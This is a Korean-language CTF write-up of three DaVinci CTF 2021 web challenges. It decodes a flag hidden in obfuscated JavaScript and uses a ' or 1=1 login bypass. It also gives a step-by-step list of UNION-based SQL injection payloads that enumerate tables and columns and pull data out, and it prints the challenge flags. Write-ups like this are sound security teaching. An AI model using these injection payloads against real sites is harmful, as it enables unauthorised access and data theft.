---
layout: post
title:  "DaVinci CTF 2021 Writeup"
tags: [DaVinciCTF,CTF-2021,CTF]
excerpt: "DaVinciCTF 2021 Writeup"
---

## Obfuscation

```
+ Description
    + My password is my secret. You will never find it...
    + To validate this chall, please enter the secret code as the flag.

+ Link
    + http://challs.dvc.tf:5555/
```

+ #### 문제 분석 & 문제 풀이

    문제 링크에 들어가보면

    ![main page](/post-images/DaVinciCTF/2021/WEB/Obfuscation/main-page.png)

    ``If you know it, enter my secret :`` 이라는 텍스트와 입력할 수 있는 공간이 있다.

    한번 테스트로 test를 입력한 다음 Send버튼을 누르면

    하단에 ``HEHE my secret is well kept !`` 이라는 메세지가 나옵니다.

    자세하게 살펴보기 위해

    ``우클릭 -> 페이지 소스 보기`` 로 해당 페이지의 소스코드를 살펴보면 ``<script>`` 태그 안에

    ```js
    var _0x562c=['179dYsldU','502577NKwytj','49301uPrsBV','%64%76%43%54%46%7b%31%74%5f%69%73%5f%6e%30%74%5f%34%5f%73%65%63%72%33%74%5f%34%6e%79%6d%30%72%33%7d','41567Xaicqe','getElementById','2IMuDQu','secret','result','111HrUPrb','238340OvJqoS','1XVHayx','innerHTML','OOO\x20NO\x20you\x20have\x20found\x20my\x20secret\x20!','353385nZcsex','value','1UUUnkm','110191GWccce'];var _0x5ae8=function(_0x34f242,_0x4f6807){_0x34f242=_0x34f242-0x175;var _0x562c5a=_0x562c[_0x34f242];return _0x562c5a;};(function(_0x10ab78,_0x2dad39){var _0x48e1e3=_0x5ae8;while(!![]){try{var _0x2dbbea=parseInt(_0x48e1e3(0x180))+-parseInt(_0x48e1e3(0x181))*parseInt(_0x48e1e3(0x178))+parseInt(_0x48e1e3(0x17d))*parseInt(_0x48e1e3(0x183))+-parseInt(_0x48e1e3(0x177))+parseInt(_0x48e1e3(0x17b))+-parseInt(_0x48e1e3(0x176))*parseInt(_0x48e1e3(0x17f))+-parseInt(_0x48e1e3(0x185))*parseInt(_0x48e1e3(0x17e));if(_0x2dbbea===_0x2dad39)break;else _0x10ab78['push'](_0x10ab78['shift']());}catch(_0x4df530){_0x10ab78['push'](_0x10ab78['shift']());}}}(_0x562c,0x5a3e5));function testSecret(){var _0x56a5a8=_0x5ae8,_0x3ee8ed=_0x56a5a8(0x182),_0x14130d=document[_0x56a5a8(0x184)](_0x56a5a8(0x186))[_0x56a5a8(0x17c)];_0x14130d==unescape(_0x3ee8ed)?document[_0x56a5a8(0x184)](_0x56a5a8(0x175))[_0x56a5a8(0x179)]=_0x56a5a8(0x17a):document[_0x56a5a8(0x184)](_0x56a5a8(0x175))[_0x56a5a8(0x179)]='HEHE\x20my\x20secret\x20is\x20well\x20kept\x20!';}
    ```

    코드 해석하기 어렵게 난독화되어있는 js코드가 있는것을 볼 수 있습니다.

    근데 ``_0x562c`` 변수에 URL Encode되어있는 값이 있는것을 보고 의심이 들어서

    ```
    %64%76%43%54%46%7b%31%74%5f%69%73%5f%6e%30%74%5f%34%5f%73%65%63%72%33%74%5f%34%6e%79%6d%30%72%33%7d
    ```
    [urlencoder](https://www.urldecoder.org/) 사이트에 들어가서 url decode해보니

    ``dvCTF{1t_is_n0t_4_secr3t_4nym0r3}`` 이렇게 FLAG가 나오게 됩니다.

``Flag is dvCTF{1t_is_n0t_4_secr3t_4nym0r3}``


* * *

## Authentication

```
+ Description
    + Can you find a way to authenticate as admin?

+ Link
    + http://challs.dvc.tf:1337/
```

+ #### 문제 분석 & 문제 풀이

    문제 링크에 들어가면 디자인 이쁘게 되어있는 로그인 페이지가 나오게됩니다.

    ![Authentication main page](/post-images/DaVinciCTF/2021/WEB/Authentication/Authentication.png)

    이 문제 설명은 ``Can you find a way to authenticate as admin?`` 즉 admin으로 인증하는 방법을 찾아보라고 한다.

    로그인은 대부분 SQL Injection기법을 사용하는 경우가 많은데 아이디와 비번을 모르니

    Username에 ``' or 1=1 -- '`` 를 넣고 Password에 아무거나 입력하면

    ![Login](/post-images/DaVinciCTF/2021/WEB/Authentication/admin-login.png)

    성공적으로 admin 유저로 로그인되는것을 볼 수 있습니다. 

    하지만 플래그가 바로 안보이는데

    ``우클릭 -> 페이지 소스보기``를 누르면 하단에

    ```html
    <p style="visibility: hidden;">dvCTF{!th4t_w4s_34sy!}</p>
    ```
    
    플래그가 나와있는것을 볼 수 있습니다.
    
    ``dvCTF{!th4t_w4s_34sy!}``

``Flag is dvCTF{!th4t_w4s_34sy!}``

* * *

## Member

```
+ Description
    + Can you get more information about the members?

+ Link
    + http://challs.dvc.tf:1337/members
```

* * *

+ #### 문제 분석

    이 문제는 Authentication문제와 url이 같은데 Authentication문제를 풀어야지 접근이 가능한것 같다.

    로그인이 되어있는 상태에서 ``/member``으로 접근하면

    ![member](/post-images/DaVinciCTF/2021/WEB/Members/members.png)

    Name를 검색하는 부분과 다양한 유저의 데이터들이 나열되어있습니다.

+ #### 문제 풀이

    이 문제 또한 SQLi라고 예측하고 UNION BASED SQL Injection를 시도하여 db 정보를 탈취 하겠습니다.

    ```sql
    ' or 1=1 -- '
    " or 1=1 -- "
    x" UNION SELECT 1 -- "
    x" UNION SELECT 1,2 -- "
    x" UNION SELECT 1,2,3 -- "
    x" UNION SELECT database(),2,3 -- "
    x" UNION SELECT (select group_concat(table_name) from information_schema.tables where table_schema=database()),2,3 -- "
    x" UNION SELECT (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="members"),(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="supa_secret_table"),3 -- "
    x" UNION SELECT (select group_concat(flag) from supa_secret_table),2,3 -- "
    ```

    먼저 SQL구문을 확인하기 위해 ' 또는 " 으로 시도한 다음
    데이터베이스, 테이블, 컬럼을 알아내고 flag 컬럼이 있는것을 보고 

    ```sql
    x" UNION SELECT (select group_concat(flag) from supa_secret_table),2,3 -- "
    ```

    이 SQL 구문으로 FLAG 컬럼에 있는 데이터를 볼 수 있게 구문을 완성 시키면

    ![flag](/post-images/DaVinciCTF/2021/WEB/Members/flag-get.png)

    이렇게 Name 부분에 ``dvCTF{1_h0p3_u_d1dnt_us3_sqlm4p}`` 플래그를 탈취하게 됩니다.

``Flag is dvCTF{1_h0p3_u_d1dnt_us3_sqlm4p}``

## 후기

시간이 많이 없어서 3문제밖에 못풀었지만
풀지 못한 문제들의 롸업들을 보면서 LDAP injection에 대해 알게됐다.

+ [ctftime](https://ctftime.org/event/1296)

<br>